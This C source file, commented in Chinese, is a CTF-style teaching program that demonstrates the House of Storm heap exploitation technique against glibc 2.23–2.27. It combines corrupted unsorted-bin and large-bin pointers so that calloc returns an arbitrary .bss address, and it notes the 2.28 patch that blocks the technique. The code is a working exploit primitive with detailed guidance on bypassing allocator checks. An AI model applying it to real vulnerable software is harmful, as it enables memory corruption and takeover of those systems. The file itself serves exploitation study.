/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_storm
 * 文件标注范围：2.23 ~ 2.27
 * 模拟漏洞：同时可改一个 unsorted chunk 和一个 largebin chunk 的链指针。
 * 核心流程：利用两条链在排序/插入时产生交叉写，伪造出落在任意目标附近的 chunk。
 * 成功判据：calloc 必须精确返回 target；2.28 的 bdc3009
 * 在每次 unsorted 摘链前检查 bck->fd==victim，封掉该组合链。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

/*
 * House of Storm 把 unsorted-bin attack 与旧 large-bin 插入写组合起来：
 * 先让被破坏的 unsorted victim 的 bk 指向任意目标附近，再让 largebin
 * 插入逻辑把一个真实堆指针错位写到目标的 size 字段。只要写出的高位字节
 * 能解释为与请求匹配的合法 size，分配器随后就会把该“任意地址伪块”返回。
 *
 * 需要的漏洞原语：
 * - 能在释放后修改一个 unsorted chunk 的链指针；
 * - 能在释放后修改一个 largebin chunk 的 fd/bk_nextsize 等链指针；
 * - 已知目标地址，以及用于推导伪 size 的堆指针高位。
 *
 * 上游注释曾把范围写成 2.26~2.28；源码审计和 2.28 负向回归表明经典链
 * 实际只到 2.27。glibc 2.28 的提交 bdc3009 在每次 unsorted 摘链前验证
 * bck->fd == victim，伪 bk 不再能把 victim 指针转向任意地址。2.26~2.27
 * 还必须预先填满对应 tcache，避免关键块被 tcache 截走。
 *
 * 原始 PoC 作者：Maxwell “Strikeout” Dulin。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>

char filler[0x60];
/* 原始样例只留 0x60 字节 target，因而只能取堆指针的最高
 * 一个字节当 fake size，在常见 0x55... 映射下会固定撞上
 * NON_MAIN_ARENA/M bit 组合并不断要求重跑。扩大教学目标后，
 * 可在“最高 1/2/3 字节”三个窗口中选择满足标志位检查的值。
 * 0x1000000 字节 BSS 能承受第三种候选下 calloc 对 fake chunk 清零。
 */
char target[0x1000000];

void init(){
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
        // 如需排除环境变量造成的地址扰动可调用 clearenv；默认保留，便于贴近普通题目环境。
}

// 计算堆指针应向右移动多少字节，才能把其最高若干字节当作合法伪 size。
// 结果还会用于反向修正 largebin 写入地址；生成的 size 必须至少达到 MINSIZE。
int get_shift_amount(char* pointer){
	
	int shift_amount = 0;
	long long ptr = (long long)pointer;	
	
	while(ptr > 0x20){
		ptr = ptr >> 8; 
		shift_amount += 1; 
	}	

	return shift_amount - 1; // 返回最高非零字节之前的位移，使最终视窗中仍保留可用的非零 size。
}

int main(){

	init();

        char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
	int* tcaches[7];

	/* 下面先准备一块 unsorted victim 和一块稍小的 largebin chunk。 */
	/*
	 * largebin 原语写入的是完整堆指针，无法直接选择数值。Storm 的关键技巧
	 * 是故意让写入地址与 fake_chunk->size 错开若干字节，使 size 看到的只是
	 * 堆指针最高一至三个字节；随后按这个 raw size 反算 malloc 请求。
	 *
	 * 写出的标志位仍受约束：bit3 不能出现在对齐后的 size 中；若
	 * NON_MAIN_ARENA 置位，则旧版检查还要求 IS_MMAPPED 置位，否则
	 * arena_for_chunk 会把 .bss 伪块解释成非法非主 arena。原始概率样例会
	 * 因 ASLR 位型失败；本回归枚举三个高字节视窗并用堆风水推进地址，稳定
	 * 找到合法组合。无泄漏题也可用相对覆盖与多次重试爆破这些位。
	 */

	int shift_amount = -1;
	size_t alloc_size = 0;

	/* 为了把原样例的“看 ASLR 运气”改成可回归的教学程序，
	 * 这里禁用 mmap 分配并在需要时用 16 MiB top padding 逐字节
	 * 推进后续 chunk 地址。padding 只是演示用的 heap feng shui；
	 * 真题可用题目的大块申请或多进程重试取得同样效果。
	 */
	mallopt(M_MMAP_MAX, 0);
	mallopt(M_MMAP_THRESHOLD, 0x20000000);

	/* largebin 写入的是一个真实堆指针。把写入地址故意向前
	 * 错位 shift_amount 字节，fake chunk 的 size 字段就会看到
	 * `heap_pointer >> (8*shift_amount)` 的高位字节。
	 *
	 * 先尝试最高 1 字节；若其 flag 不合法，再尝试最高
	 * 2/3 字节。这不是额外的堆管理器能力，只是利用者对大块
	 * target 内的写入错位有选择权。
	 */
	for (int steering = 0; steering < 16 && shift_amount < 0; steering++) {
		unsorted_bin = malloc(0x4e8);  // 请求 0x4e8，对应物理 chunk size 0x4f0。
		malloc(0x18);                  // 保护块隔开 victim 与 top，防止释放时向后合并。

		int highest_shift = get_shift_amount(unsorted_bin);
		for (int candidate = highest_shift; candidate >= highest_shift - 2; candidate--) {
			size_t raw = ((size_t)unsorted_bin) >> (8 * candidate);
			raw &= ~(size_t)1;  // 清掉 PREV_INUSE；分配请求的对齐换算会统一处理有效尺寸。
			if (raw < 0x20)
				continue;

			size_t request = raw - 0x10;
			if (request >= sizeof(target) - 0x20)
				continue;

			/* bit3 不能成为非 size flag；若 NON_MAIN_ARENA(bit2)=1，
			 * 则这个 .bss fake chunk 只能靠 IS_MMAPPED(bit1)=1 通过老检查。
			 */
			if ((request & 0x8) != 0 ||
			    (((request & 0x4) == 0x4) && ((request & 0x2) != 0x2)))
				continue;

			shift_amount = candidate;
			alloc_size = request;
			break;
		}

		if (shift_amount < 0) {
			void *padding = malloc(0x1000000);  // 推进 16 MiB，让下一候选地址的第 4 字节递增。
			if (padding == NULL)
				abort();
		}
	}

	if (shift_amount < 0)
		abort();

        // 在真正破坏链表前重复验证伪 size 标志位，避免把预期失败误当作利用不稳定。
	/*
	 * 2.27 对返回 chunk 的检查要求下面至少一项成立：
	 *   1. 当前 av 等于 arena_for_chunk(mem2chunk(mem))；
	 *   2. chunk 带有 IS_MMAPPED 标志。
	 * 源码位置：
	 * https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
	 *
	 * 本例伪块位于 .bss，不属于当前 arena；若 NON_MAIN_ARENA 置位，第一项
	 * 必然失败，此时必须同时让 IS_MMAPPED 置位。下方条件还排除 bit3 非零，
	 * 因为它不是合法 size 标志，会破坏请求尺寸比较。
	 */
        if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))){
                return 1;
        }

	// 若反算请求落在 tcache 范围，先填满该尺寸 tcache，防止 tcache stashing
	// 在 unsorted 遍历期间截走 victim，导致后面的经典 bin 路径不执行。
	if(alloc_size < 0x410){

		// 分配并释放 7 块同尺寸 chunk，把默认容量为 7 的 tcache bin 填满。
		for(int i = 0; i < 7; i++){
			tcaches[i] = malloc(alloc_size);
		}
		for(int i = 0; i < 7; i++){
			free(tcaches[i]);
		}
	}
	else{
	}

	large_bin  =  malloc ( 0x4d8 );  // 请求 0x4d8，对应物理 chunk size 0x4e0。
	// 在 large_bin 后放置保护块，防止它释放时与 top 或相邻 free chunk 合并。
	malloc ( 0x18 );

	// 按释放顺序布置 unsorted FIFO：较小的 0x4e0 块先入队。
	free ( large_bin );  // 先放入将来要被整理到 largebin 的较小块。
	free ( unsorted_bin );

	// 申请更大的同类请求，促使 0x4e0 块从 unsorted 被整理进 largebin。
	unsorted_bin = malloc(0x4e8);
	free(unsorted_bin);

	/*
	 * 现在 largebin 中恰有一个 0x4e0 块，unsorted 中恰有一个 0x4f0 块。
	 * unsorted victim 必须比既有 largebin chunk 大，但二者仍需归入同一个
	 * largebin 索引；这样整理 victim 时才走“向已有链插入较大块”的 nextsize
	 * 分支，并产生 Storm 需要的交叉写。真题堆风水必须维护这两个条件。
	 */

	// malloc 返回用户区，因此把任意目标前移 0x10，按 chunk header 解释为 fake_chunk。
	fake_chunk = target - 0x10;

	/*
	 * 漏洞一：把 unsorted victim 的 bk 改为 fake_chunk。旧版摘链副作用会把
	 * unsorted 表头写到 fake_chunk->fd；更重要的是，后续 victim 游标会沿
	 * 伪 bk 接触这个任意地址。单独的 unsorted attack 还不足以返回该地址，
	 * 下一步 largebin 写负责补出能通过检查的 size。
	 */
	((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // 用户区第 2 个机器字对应 unsorted_bin->bk。

	// large_bin->fd 在这里只需可解引用；指到 fake_chunk+8 以配合交叉链写。
	(( size_t *) large_bin )[1]  =  (size_t)fake_chunk  +  8 ;  // 用户区第 2 个机器字对应 large_bin->fd。

	/*
	 * 漏洞二：篡改 large_bin->bk_nextsize，把旧 largebin 插入写变成定址写。
	 * 对应旧源码：
	 * https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579
	 *
	 * 插入语句最终写入某个伪节点的 fd_nextsize，字段偏移为 0x18，所以先从
	 * fake_chunk 减 0x18。再减 shift_amount 是为了故意错位：例如要写入的
	 * 堆指针为 0x123456，写地址从 0x60006 开始，则内存字节依次为 0x56、
	 * 0x34、0x12；从 0x60008 读取 size 时只会看到高位 0x12。真实 PoC
	 * 根据指针长度计算错位量，让 fake_chunk->size 恰好读到前面反算的 raw。
	 * 没有这次错位 size 写，任意地址无法通过 unsorted 的尺寸匹配检查。
	 */
	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // 用户区第 4 个机器字对应 bk_nextsize。

	/*
	 * 两处链指针现已同时就位：伪 unsorted bk 负责把遍历引到任意地址，伪
	 * bk_nextsize 负责先在该地址补出匹配 size。下面发起精确尺寸请求时，
	 * 整理 largebin 的写先发生，随后 unsorted 看到 fake chunk 尺寸合法，
	 * 最终应把 target 当作用户区返回。
	 */

	// 返回前 arena_for_chunk 仍会检查伪块标志；上方枚举已保证对应条件成立。
	// 参考源码：https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
	ptr = calloc(alloc_size, 1);
	if (ptr != target) {
		fprintf(stderr, "[-] Storm：结果=%p，目标=%p\n", ptr, target);
		abort();
	}

	memcpy(ptr, "STORM_OK", 9);
	if (memcmp(target, "STORM_OK", 9) != 0)
		abort();

	puts("[+] Storm：.bss 目标命中");
	return 0;
}
